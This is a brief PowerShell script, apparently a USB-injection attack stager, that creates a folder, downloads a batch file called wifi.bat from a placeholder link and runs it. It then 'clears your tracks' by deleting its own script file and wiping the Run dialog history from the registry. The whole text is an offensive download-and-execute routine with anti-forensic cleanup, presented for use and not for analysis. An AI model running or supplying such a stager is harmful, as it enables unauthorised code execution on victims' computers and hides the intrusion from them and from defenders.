cd /; mkdir x64; cd x64;

wget PASTE-YOUR-LINK-HERE -OutFile wifi.bat

start wifi.bat

 // --> Clearing your tracks

rm a.PS1 -Force

Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

exit
